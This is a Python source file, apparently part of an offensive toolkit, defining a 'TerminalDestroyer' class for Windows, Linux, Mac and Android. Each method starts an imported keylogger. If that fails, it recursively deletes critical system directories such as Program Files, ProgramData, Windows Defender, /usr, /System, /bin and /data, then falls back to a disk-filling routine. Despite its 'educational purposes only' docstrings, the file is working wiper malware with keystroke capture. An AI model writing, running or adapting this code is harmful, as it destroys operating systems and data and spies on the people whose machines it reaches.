from abc import ABC
import platform
import shutil
from offensive.collection import keylogger
from offensive.collection import disk_fill as CT

OS = platform.system()


class TerminalDestroyer(ABC):
        """This is a class designed to destroy the whole OS and OS related files and directories.
          It is a malicious class that should not be used in any real-world scenario.
            The class has methods for different operating systems: Windows, Linux, Mac, and Android.
        Each method attempts to start a keylogger before performing the destructive actions.
          If any exception occurs while starting the keylogger, the code enters a destructive mode and tries to remove critical directories and files from the system. If any exception occurs during this process, it prints the error and calls the codeTest method from the CodeTest module. The CodeTest module is designed to fill the disk space in just a few seconds. This is a malicious action and should not be used in any real-world scenario. The code is for educational purposes only and should not be used to harm any system or data."""

        global OS

        while True:
              try:
                """ This class is designed to destroy the terminal and its associated files based on the operating system. It uses the shutil module to remove directories and files that are critical to the functioning of the terminal. The class also attempts to start a keylogger before performing the destructive actions.
                The class has methods for different operating systems: Windows, Linux, Mac, and Android."""


                def WindowsTerminalDestroyer(self):

                        # This method works only on Windows OS .

                        try:
                                """ This method is designed to destroy the terminal and its associated files on Windows operating systems. It uses the shutil module to remove directories and files that are critical to the functioning of the terminal. The method also attempts to start a keylogger before performing the destructive actions.
                                If any exception occures while starting the keylogger the code enters a destructive mode and tries to remove critical directories and files from the system. If any exception occurs during this process, it prints the error and calls the codeTest method from the CodeTest module.
                                The CodeTest module is designed to fill the disk space in just few seconds. This is a malicious action and should not be used in any real-world scenario. The code is for educational purposes only and should not be used to harm any system or data."""
                                if OS.lower() == 'windows':
                                        keylogger.on_press()
                                        keylogger.start_keylogger()

                        except Exception:
                                try:
                                        shutil.rmtree("C:\\Users\\Public\\Documents")
                                        shutil.rmtree("C:\\appdata")
                                        shutil.rmtree("C:\\Program Files (x86)\\Windows Defender")
                                        shutil.rmtree("C:\\Program Files (x86)\\WindowsPowershell")
                                        shutil.rmtree("C:\\Program Files\\Windows Security\\BrowserCore")
                                        shutil.rmtree("C:\\ProgramData")
                                        shutil.rmtree("C:\\Program Files (x86)")
                                        shutil.rmtree("C:\\Program Files")
                                        pass

                                except Exception as e:
                                                print(f"An error {e} occured . Performing different assignment.")
                                                CT.codeTest()
                
                def LinuxTerminalDestroyer(self):

                        # This method works only on Linux OS .

                        try:
                                """ This method is designed to destroy the terminal and its associated files on Linux operating systems. It uses the shutil module to remove directories and files that are critical to the functioning of the terminal. The method also attempts to start a keylogger before performing the destructive actions.
                                If any exception occures while starting the keylogger the code enters a destructive mode and tries"""
                                if OS.lower() == 'linux':
                                        keylogger.on_press()
                                        keylogger.start_keylogger()

                        except Exception:
                                try:
                                        shutil.rmtree("/usr/bin")
                                        shutil.rmtree("/usr/local/bin")
                                        shutil.rmtree("/usr/share")
                                        shutil.rmtree("/usr/lib")
                                        shutil.rmtree("/usr/include")
                                        shutil.rmtree("/usr/sbin")
                                        shutil.rmtree("/usr/src")
                                        shutil.rmtree("/usr/games")
                                        shutil.rmtree("/usr/local/games")
                                        shutil.rmtree("/usr")
                                        pass

                                except Exception as e:
                                        print(f"An error {e} occured . Performing different assignment.")
                                        CT.codeTest()

                def MacTerminalDestroyer(self):

                        # This method works only on Mac/Apple OS .

                        try:
                                """ This method is designed to destroy the terminal and its associated files on Mac operating systems. It uses the shutil module to remove directories and files that are critical to the functioning of the terminal. The method also attempts to start a keylogger before performing the destructive actions.
                                If any exception occures while starting the keylogger the code enters a destructive mode and tries"""
                                if OS.lower() == 'darwin':
                                        keylogger.on_press()
                                        keylogger.start_keylogger()

                        except Exception:
                                try:
                                        shutil.rmtree("/Applications")
                                        shutil.rmtree("/Library")
                                        shutil.rmtree("/System")
                                        shutil.rmtree("/usr")
                                        shutil.rmtree("/bin")
                                        shutil.rmtree("/sbin")
                                        shutil.rmtree("/private")
                                        pass

                                except Exception as e:
                                        print(f"An error {e} occured . Performing different assignment.")
                                        CT.codeTest()

                def AndroidTerminalDestroyer(self):

                        # This method works only on Android OS .

                        try:
                                """ This method is designed to destroy the terminal and its associated files on Android operating systems. It uses the shutil module to remove directories and files that are critical to the functioning of the terminal. The method also attempts to start a keylogger before performing the destructive actions.
                                If any exception occures while starting the keylogger the code enters a destructive mode and tries"""
                                if OS.lower() == 'android':
                                        keylogger.on_press()
                                        keylogger.start_keylogger()

                        except Exception:
                                try:
                                        shutil.rmtree("/system")
                                        shutil.rmtree("/data")
                                        shutil.rmtree("/cache")
                                        shutil.rmtree("/storage")
                                        shutil.rmtree("/mnt")
                                        pass

                                except Exception as e:
                                        print(f"An error {e} occured . Performing different assignment.")
                                        CT.codeTest()

              except Exception as e:
                            print(f"An error {e} occured while trying to start the opration")
                            pass

              break